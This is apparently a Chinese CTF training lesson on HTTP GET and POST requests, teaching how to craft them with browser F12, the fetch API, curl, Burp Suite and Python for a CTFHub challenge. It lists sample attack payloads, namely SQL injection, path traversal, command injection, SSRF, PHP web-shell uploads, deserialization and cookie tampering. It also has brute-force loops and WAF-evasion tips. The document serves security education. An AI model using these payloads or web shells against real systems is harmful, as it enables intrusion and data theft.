# Day 2：GET与POST手搓战

> **学习目标**：深入理解GET和POST请求的区别，掌握使用F12和fetch API构造请求
> 
> **学习时长**：2-3小时
> 
> **难度等级**：⭐⭐

---

## 📚 今日内容概览

1. GET请求详解
2. POST请求详解
3. GET与POST的区别
4. 使用F12修改请求方法
5. fetch API基础
6. 使用fetch构造请求
7. 实战练习：CTFHub POST请求

---

## 一、GET请求详解

### 1.1 GET请求定义

```
GET请求：
  HTTP协议中最常用的请求方法
  用于从服务器获取资源

特点：
  - 参数在URL中传递
  - 参数可见，不安全
  - 有URL长度限制
  - 可被缓存
  - 可被收藏为书签
  - 幂等操作（多次请求结果相同）
```

### 1.2 GET请求格式

```
基本格式：
  GET /path?param1=value1&param2=value2 HTTP/1.1
  Host: www.example.com
  User-Agent: Mozilla/5.0

完整示例：
  GET /search?q=ctf&page=1 HTTP/1.1
  Host: www.google.com
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
  Accept: text/html
  Accept-Language: zh-CN,zh;q=0.9
  Connection: keep-alive

URL参数编码：
  原始：?name=张三&msg=hello world
  编码：?name=%E5%BC%A0%E4%B8%89&msg=hello%20world

常见编码：
  空格 → %20 或 +
  & → %26
  = → %3D
  # → %23
  % → %25
```

### 1.3 GET请求在CTF中的应用

```
常见场景：
  1. 信息泄露：URL参数暴露敏感信息
  2. SQL注入：参数未过滤导致注入
  3. 文件包含：file参数控制文件路径
  4. 命令执行：cmd参数执行系统命令
  5. SSRF：url参数发起服务端请求

典型Payload：
  # SQL注入
  ?id=1' UNION SELECT 1,2,3--
  
  # 文件包含
  ?file=../../../etc/passwd
  ?file=php://filter/convert.base64-encode/resource=index.php
  
  # 命令执行
  ?cmd=; cat /flag
  ?ip=127.0.0.1; ls
  
  # SSRF
  ?url=http://127.0.0.1/flag
  ?url=file:///etc/passwd

CTFHub示例：
  ?id=1
  ?page=2
  ?file=hint.txt
```

### 1.4 GET请求的安全问题

```
1. 参数泄露：
   - URL被记录在浏览器历史
   - URL被记录在服务器日志
   - URL可被代理服务器记录
   - URL可被他人看到

2. 参数篡改：
   - 用户可随意修改参数
   - 需要后端验证参数合法性
   - 敏感操作不应使用GET

3. CSRF攻击：
   - GET请求容易被伪造
   - 攻击者可构造恶意链接
   - 用户点击后自动执行

4. 信息泄露：
   - 敏感信息不应放在URL
   - 密码、Token等应用POST
   - 使用HTTPS加密传输
```

---

## 二、POST请求详解

### 2.1 POST请求定义

```
POST请求：
  HTTP协议中用于提交数据的请求方法
  常用于表单提交、文件上传等

特点：
  - 参数在请求体中传递
  - 参数不可见，相对安全
  - 无长度限制
  - 不可被缓存
  - 不可收藏为书签
  - 非幂等操作（多次请求可能结果不同）
```

### 2.2 POST请求格式

```
基本格式：
  POST /path HTTP/1.1
  Host: www.example.com
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 27
  
  param1=value1&param2=value2

完整示例：
  POST /login HTTP/1.1
  Host: www.example.com
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 29
  User-Agent: Mozilla/5.0
  
  username=admin&password=123456

请求体编码：
  application/x-www-form-urlencoded：
    username=admin&password=123456
    
  multipart/form-data（文件上传）：
    ------WebKitFormBoundary
    Content-Disposition: form-data; name="file"; filename="shell.php"
    Content-Type: application/octet-stream
    
    <?php @eval($_POST['cmd']); ?>
    ------WebKitFormBoundary--
    
  application/json：
    {"username":"admin","password":"123456"}
```

### 2.3 Content-Type类型

```
常见Content-Type：

1. application/x-www-form-urlencoded
   - 默认表单编码
   - 参数格式：key1=value1&key2=value2
   - 特殊字符需要URL编码

2. multipart/form-data
   - 文件上传使用
   - boundary分隔符分隔各部分
   - 每部分可指定Content-Type

3. application/json
   - JSON格式数据
   - RESTful API常用
   - 需要设置Content-Type

4. text/plain
   - 纯文本格式
   - 较少使用

5. application/xml
   - XML格式数据
   - SOAP协议使用

CTF中的利用：
  - 修改Content-Type绕过过滤
  - JSON注入
  - XML外部实体注入（XXE）
```

### 2.4 POST请求在CTF中的应用

```
常见场景：
  1. 登录绕过：修改用户名密码参数
  2. SQL注入：POST参数注入
  3. 文件上传：上传恶意文件
  4. 反序列化：提交序列化数据
  5. SSRF：POST方式触发SSRF

典型Payload：
  # 登录绕过
  username=admin' or '1'='1&password=123
  
  # SQL注入
  id=1 UNION SELECT 1,2,3--
  
  # 文件上传
  ------WebKitFormBoundary
  Content-Disposition: form-data; name="file"; filename="shell.php"
  
  <?php @eval($_POST['cmd']); ?>
  ------WebKitFormBoundary--
  
  # 反序列化
  data=O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}

CTFHub示例：
  POST /login HTTP/1.1
  Content-Type: application/x-www-form-urlencoded
  
  username=admin&password=admin
```

---

## 三、GET与POST的区别

### 3.1 核心区别对比

| 对比项 | GET | POST |
|:---|:---|:---|
| 参数位置 | URL中 | 请求体中 |
| 参数可见性 | 可见 | 不可见 |
| 参数长度 | 有限制（约2KB-8KB） | 无限制 |
| 缓存 | 可被缓存 | 不可缓存 |
| 书签 | 可收藏 | 不可收藏 |
| 历史记录 | 保留在历史 | 不保留 |
| 幂等性 | 幂等 | 非幂等 |
| 安全性 | 相对不安全 | 相对安全 |
| 编码类型 | application/x-www-form-urlencoded | 多种类型 |
| TCP数据包 | 一个包（Header+Data） | 两个包（先Header后Data） |

### 3.2 使用场景对比

```
GET适用场景：
  ✅ 获取资源（查询数据）
  ✅ 搜索请求
  ✅ 分页请求
  ✅ 可分享的链接
  ✅ 幂等操作

POST适用场景：
  ✅ 提交数据（创建/更新）
  ✅ 登录表单
  ✅ 文件上传
  ✅ 敏感信息传输
  ✅ 非幂等操作

错误使用：
  ❌ 使用GET传输密码
  ❌ 使用GET执行删除操作
  ❌ 使用POST获取静态资源
  ❌ 使用GET上传大文件
```

### 3.3 CTF中的选择

```
CTF题目中的判断：
  1. 查看题目提示
  2. 查看源代码中的form标签method属性
  3. 查看JavaScript代码中的请求方式
  4. 尝试两种方式看响应

常见套路：
  - 题目要求使用POST → 改GET为POST
  - 参数在URL中 → GET请求
  - 参数在请求体中 → POST请求
  - 文件上传 → POST + multipart/form-data
  - API接口 → 通常是POST + JSON

技巧：
  - 有些题目GET和POST都能解
  - 有些题目必须用POST
  - 尝试修改请求方式可能有意想不到的收获
```

---

## 四、使用F12修改请求方法

### 4.1 F12修改请求概述

```
为什么需要修改请求：
  1. 题目要求使用特定请求方法
  2. 绕过前端验证
  3. 测试后端逻辑
  4. 发现隐藏接口

F12修改方式：
  1. Console中使用fetch API
  2. Network面板重放请求
  3. 使用Copy as fetch
```

### 4.2 方法一：Console使用fetch

```
基本fetch语法：
  fetch(url, options)
    .then(response => response.text())
    .then(data => console.log(data));

GET请求示例：
  fetch('/api/data?id=1')
    .then(r => r.text())
    .then(data => console.log(data));

POST请求示例：
  fetch('/api/login', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'username=admin&password=123'
  })
    .then(r => r.text())
    .then(data => console.log(data));

JSON格式POST：
  fetch('/api/login', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      username: 'admin',
      password: '123'
    })
  })
    .then(r => r.json())
    .then(data => console.log(data));
```

### 4.3 方法二：Network重放请求

```
步骤：
  1. F12打开开发者工具
  2. 切换到Network面板
  3. 刷新页面触发请求
  4. 找到目标请求，右键
  5. 选择"Edit and Resend"（部分浏览器支持）
  6. 修改请求方法和参数
  7. 发送请求

Chrome操作：
  1. Network面板找到请求
  2. 右键→Copy→Copy as fetch
  3. 在Console中粘贴
  4. 修改method和body
  5. 执行

Firefox操作：
  1. Network面板找到请求
  2. 右键→Edit and Resend
  3. 直接修改请求
  4. 发送
```

### 4.4 方法三：Copy as fetch

```
操作步骤：
  1. Network面板找到请求
  2. 右键→Copy→Copy as fetch
  3. 在Console中粘贴代码
  4. 修改需要改的部分
  5. 回车执行

示例：
  原始GET请求：
  fetch("http://ctf.example.com/api?id=1", {
    "headers": {
      "accept": "text/html"
    },
    "method": "GET"
  });
  
  修改为POST：
  fetch("http://ctf.example.com/api", {
    "headers": {
      "accept": "text/html",
      "content-type": "application/x-www-form-urlencoded"
    },
    "method": "POST",
    "body": "id=1"
  });
```

### 4.5 实战技巧

```
技巧1：快速切换请求方法
  - 复制GET请求为fetch
  - 只需修改method和添加body
  - 不需要重新构造整个请求

技巧2：保留原始请求头
  - Copy as fetch会保留所有请求头
  - 包括Cookie、User-Agent等
  - 方便调试

技巧3：批量测试
  - 在Console中写循环
  - 批量发送请求测试
  - 注意频率限制

示例循环：
  for (let i = 1; i <= 100; i++) {
    fetch(`/api?id=${i}`)
      .then(r => r.text())
      .then(data => {
        if (data.includes('flag')) {
          console.log(`Found at id=${i}: ${data}`);
        }
      });
  }
```

---

## 五、fetch API基础

### 5.1 fetch API介绍

```
什么是fetch API：
  - 现代浏览器提供的网络请求接口
  - 基于Promise设计
  - 替代XMLHttpRequest
  - 语法更简洁

基本语法：
  fetch(url, options)
    .then(response => response.json())
    .then(data => console.log(data))
    .catch(error => console.error(error));

options参数：
  {
    method: 'GET',        // 请求方法
    headers: {...},       // 请求头
    body: ...,            // 请求体
    mode: 'cors',         // 跨域模式
    credentials: 'include', // 发送Cookie
    cache: 'default',     // 缓存模式
    redirect: 'follow'    // 重定向处理
  }
```

### 5.2 fetch请求方法

```
GET请求：
  // 最简单形式
  fetch('/api/data')
    .then(r => r.text())
    .then(data => console.log(data));
  
  // 带参数
  fetch('/api/data?id=1&name=test')
    .then(r => r.json())
    .then(data => console.log(data));
  
  // 带请求头
  fetch('/api/data', {
    headers: {
      'Authorization': 'Bearer token123'
    }
  })
    .then(r => r.json())
    .then(data => console.log(data));

POST请求：
  // 表单格式
  fetch('/api/login', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'username=admin&password=123'
  })
    .then(r => r.text())
    .then(data => console.log(data));
  
  // JSON格式
  fetch('/api/login', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      username: 'admin',
      password: '123'
    })
  })
    .then(r => r.json())
    .then(data => console.log(data));

PUT请求：
  fetch('/api/user/1', {
    method: 'PUT',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      name: 'newname'
    })
  });

DELETE请求：
  fetch('/api/user/1', {
    method: 'DELETE'
  });
```

### 5.3 响应处理

```
响应对象属性：
  response.status    // 状态码 (200, 404, etc.)
  response.statusText // 状态文本 (OK, Not Found, etc.)
  response.ok        // 是否成功 (status 200-299)
  response.headers   // 响应头
  response.url       // 最终URL（可能有重定向）

响应解析方法：
  response.text()    // 解析为文本
  response.json()    // 解析为JSON
  response.blob()    // 解析为Blob（二进制）
  response.arrayBuffer() // 解析为ArrayBuffer
  response.formData()    // 解析为FormData

示例：
  fetch('/api/data')
    .then(response => {
      console.log('Status:', response.status);
      console.log('OK:', response.ok);
      console.log('Headers:', response.headers.get('Content-Type'));
      return response.json();
    })
    .then(data => {
      console.log('Data:', data);
    });

错误处理：
  fetch('/api/data')
    .then(response => {
      if (!response.ok) {
        throw new Error('HTTP error ' + response.status);
      }
      return response.json();
    })
    .then(data => console.log(data))
    .catch(error => console.error('Error:', error));
```

### 5.4 fetch在CTF中的应用

```
应用场景：
  1. 快速构造请求
  2. 修改请求方法和参数
  3. 添加自定义请求头
  4. 发送JSON数据
  5. 绕过前端验证

常见用法：
  # 修改请求方法
  fetch('/api', {method: 'POST', body: 'data'});
  
  # 添加Cookie
  fetch('/api', {
    headers: {'Cookie': 'admin=1'}
  });
  
  # 修改User-Agent
  fetch('/api', {
    headers: {
      'User-Agent': 'CTF-Bot/1.0'
    }
  });
  
  # 发送JSON
  fetch('/api', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({cmd: 'cat /flag'})
  });

高级技巧：
  # 读取响应头
  fetch('/api')
    .then(r => {
      const flag = r.headers.get('X-Flag');
      if (flag) console.log('Flag:', flag);
      return r.text();
    });
  
  # 发送FormData
  const formData = new FormData();
  formData.append('file', fileBlob, 'shell.php');
  fetch('/upload', {
    method: 'POST',
    body: formData
  });
```

---

## 六、实战练习：CTFHub POST请求

### 6.1 题目分析

```
题目名称：POST请求
题目描述：请用POST方式提交数据

解题思路：
  1. 分析题目要求
  2. 确定需要POST的参数
  3. 构造POST请求
  4. 获取Flag
```

### 6.2 解题方法一：F12 Console

```
步骤：
  1. 打开题目页面
  2. F12打开开发者工具
  3. 切换到Console面板
  4. 输入fetch代码
  5. 回车执行

代码：
  fetch(window.location.href, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'a=1'
  })
    .then(r => r.text())
    .then(data => {
      console.log(data);
      // 查找Flag
      const match = data.match(/flag\{[^}]+\}/);
      if (match) {
        console.log('Flag:', match[0]);
      }
    });

说明：
  - window.location.href：当前页面URL
  - method: 'POST'：指定POST方法
  - body：POST请求体
```

### 6.3 解题方法二：F12 Network重放

```
步骤：
  1. 打开题目页面
  2. F12打开开发者工具
  3. Network面板查看请求
  4. 找到当前页面的GET请求
  5. 右键→Copy→Copy as fetch
  6. 在Console中粘贴
  7. 修改method为POST
  8. 添加body参数
  9. 执行

修改示例：
  原始：
  fetch("http://ctfhub.com/...", {"method": "GET"});
  
  修改后：
  fetch("http://ctfhub.com/...", {
    "method": "POST",
    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
    "body": "a=1"
  });
```

### 6.4 解题方法三：Burp Suite

```
步骤：
  1. 配置浏览器代理到Burp
  2. 访问题目页面
  3. Burp拦截请求
  4. 发送到Repeater
  5. 修改请求方法为POST
  6. 添加请求体
  7. 发送请求

请求示例：
  POST /api HTTP/1.1
  Host: ctfhub.com
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 3
  
  a=1
```

### 6.5 解题方法四：curl命令

```
curl命令：
  curl -X POST -d "a=1" http://ctfhub.com/api

参数说明：
  -X POST：指定POST方法
  -d "a=1"：POST数据
  -H "Content-Type: ..."：添加请求头

完整示例：
  curl -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "a=1" \
    http://ctfhub.com/api

JSON格式：
  curl -X POST \
    -H "Content-Type: application/json" \
    -d '{"a":1}' \
    http://ctfhub.com/api
```

### 6.6 解题方法五：Python脚本

```python
import requests

# POST请求
url = "http://ctfhub.com/api"
data = {"a": "1"}

response = requests.post(url, data=data)
print(response.text)

# 查找Flag
import re
flag = re.search(r'flag\{[^}]+\}', response.text)
if flag:
    print("Flag:", flag.group())

# JSON格式POST
import json
headers = {"Content-Type": "application/json"}
response = requests.post(url, json={"a": 1}, headers=headers)
print(response.text)
```

---

## 七、进阶练习

### 7.1 练习1：修改请求头

```
题目场景：
  某题目要求User-Agent为特定值

解题代码：
  fetch('/api', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)'
    },
    body: 'data=test'
  })
    .then(r => r.text())
    .then(data => console.log(data));
```

### 7.2 练习2：Cookie修改

```
题目场景：
  某题目需要admin=1的Cookie

解题代码：
  fetch('/api', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Cookie': 'admin=1'
    },
    body: 'action=getFlag'
  })
    .then(r => r.text())
    .then(data => console.log(data));

注意：
  在Console中设置Cookie可能被浏览器限制
  可以使用document.cookie设置：
  document.cookie = "admin=1";
  然后再发送请求
```

### 7.3 练习3：JSON数据提交

```
题目场景：
  某API需要JSON格式的POST数据

解题代码：
  fetch('/api', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      username: 'admin',
      password: '123456',
      role: 'admin'
    })
  })
    .then(r => r.json())
    .then(data => {
      console.log(data);
      if (data.flag) {
        console.log('Flag:', data.flag);
      }
    });
```

### 7.4 练习4：文件上传模拟

```
题目场景：
  模拟文件上传请求

解题代码：
  // 创建FormData
  const formData = new FormData();
  formData.append('file', new Blob(['<?php system($_GET["cmd"]); ?>'], 
    {type: 'application/octet-stream'}), 'shell.php');
  formData.append('submit', 'Upload');

  fetch('/upload', {
    method: 'POST',
    body: formData
  })
    .then(r => r.text())
    .then(data => console.log(data));

注意：
  使用FormData时不需要设置Content-Type
  浏览器会自动设置multipart/form-data和boundary
```

### 7.5 练习5：批量请求

```
题目场景：
  需要遍历ID找到Flag

解题代码：
  async function bruteForce() {
    for (let id = 1; id <= 100; id++) {
      const response = await fetch('/api', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: `id=${id}`
      });
      const text = await response.text();
      
      if (text.includes('flag')) {
        console.log(`Found at id=${id}`);
        console.log(text);
        break;
      }
    }
  }
  
  bruteForce();

注意：
  - 使用async/await处理异步
  - 注意请求频率，避免被限制
  - 可以添加延时：await new Promise(r => setTimeout(r, 100));
```

---

## 八、常见问题与解决

### 8.1 跨域问题

```
问题：
  Access-Control-Allow-Origin错误

原因：
  浏览器同源策略限制

解决方法：
  1. 后端设置CORS头
  2. 使用代理服务器
  3. 使用Burp Suite发送请求
  4. 使用curl或Python脚本

在CTF中：
  - 大多数CTF题目不存在跨域问题
  - 如果遇到，使用Burp或curl
```

### 8.2 Cookie设置问题

```
问题：
  在fetch中设置Cookie不生效

原因：
  浏览器安全策略限制

解决方法：
  1. 使用document.cookie设置
  2. 使用credentials: 'include'
  3. 使用Burp Suite

示例：
  // 方法1：document.cookie
  document.cookie = "admin=1";
  fetch('/api', {credentials: 'include'})
    .then(r => r.text())
    .then(console.log);
  
  // 方法2：credentials
  fetch('/api', {
    credentials: 'include',
    headers: {'Cookie': 'admin=1'}
  });
```

### 8.3 请求被拦截

```
问题：
  请求被WAF或防火墙拦截

原因：
  请求特征被识别

解决方法：
  1. 修改User-Agent
  2. 添加Referer
  3. 使用正常请求头
  4. 降低请求频率

示例：
  fetch('/api', {
    method: 'POST',
    headers: {
      'User-Agent': 'Mozilla/5.0 ...',
      'Referer': 'http://example.com/',
      'Accept': 'text/html',
      'Accept-Language': 'zh-CN,zh;q=0.9'
    },
    body: 'data=test'
  });
```

### 8.4 响应乱码

```
问题：
  响应内容显示乱码

原因：
  编码格式不匹配

解决方法：
  1. 检查Content-Type中的charset
  2. 使用正确的编码解析
  3. 使用Blob处理二进制

示例：
  fetch('/api')
    .then(r => r.blob())
    .then(blob => {
      const reader = new FileReader();
      reader.onload = () => console.log(reader.result);
      reader.readAsText(blob, 'UTF-8'); // 或 'GBK'
    });
```

---

## 九、今日总结

### 9.1 知识点回顾

```
✅ GET请求
  - 参数在URL中
  - 有长度限制
  - 可被缓存和收藏

✅ POST请求
  - 参数在请求体中
  - 无长度限制
  - 支持多种Content-Type

✅ GET与POST区别
  - 参数位置、安全性、缓存等

✅ F12修改请求
  - Console使用fetch
  - Network重放请求
  - Copy as fetch

✅ fetch API
  - 基本语法
  - 请求方法
  - 响应处理

✅ CTFHub实战
  - 多种解题方法
  - 实际应用场景
```

### 9.2 今日作业

```
必做题：
  1. 完成CTFHub「POST请求」题目
  2. 使用至少3种不同方法解题
  3. 记录每种方法的优缺点

选做题：
  1. 编写Python脚本自动化解题
  2. 尝试修改不同的请求头
  3. 实现批量请求功能

提交内容：
  - 解题截图
  - 代码文件
  - 学习笔记
```

### 9.3 明日预告

```
Day 3：Cookie越权

学习内容：
  - Cookie原理与结构
  - Cookie安全属性
  - Cookie越权攻击
  - Session劫持
  - CTFHub Cookie题目

准备工作：
  - 复习HTTP Cookie知识
  - 了解Session原理
```

---

## 十、扩展阅读

### 10.1 HTTP协议深入

```
推荐资源：
  - RFC 7231: HTTP/1.1 Semantics and Content
  - MDN HTTP教程
  - 《HTTP权威指南》

进阶知识：
  - HTTP/2新特性
  - HTTP/3与QUIC
  - HTTPS加密原理
  - HTTP缓存机制
```

### 10.2 Web安全基础

```
推荐资源：
  - OWASP Top 10
  - 《Web安全深度剖析》
  - 《白帽子讲Web安全》

学习路径：
  1. HTTP协议
  2. 前端安全（XSS/CSRF）
  3. 后端安全（SQL注入/命令执行）
  4. 服务端安全（SSRF/XXE）
  5. 高级漏洞（反序列化/SSTI）
```

### 10.3 工具推荐

```
浏览器插件：
  - Wappalyzer：识别Web技术栈
  - HackBar：快速构造请求
  - Cookie Editor：Cookie管理
  - ModHeader：修改请求头

命令行工具：
  - curl：HTTP请求
  - wget：下载文件
  - httpie：友好的HTTP客户端

Python库：
  - requests：HTTP请求
  - httpx：异步HTTP客户端
  - aiohttp：异步HTTP
```

---

## 十一、笔记模板

```
Day 2 学习笔记
====================

日期：____年__月__日
学习时长：___小时

一、GET与POST区别
----------------
| 对比项 | GET | POST |
|-------|-----|------|
|       |     |       |
|       |     |       |


二、fetch API语法
----------------
基本语法：
  

GET请求：
  

POST请求：
  


三、解题记录
------------
方法1：F12 Console
  代码：
  结果：

方法2：Burp Suite
  请求：
  结果：

方法3：Python脚本
  代码：
  结果：


四、遇到的问题
--------------
问题：
  解决方法：


五、心得体会
------------


六、明日计划
------------
1. 
2. 
```

---

**恭喜你完成Day 2的学习！继续加油！** 🎉
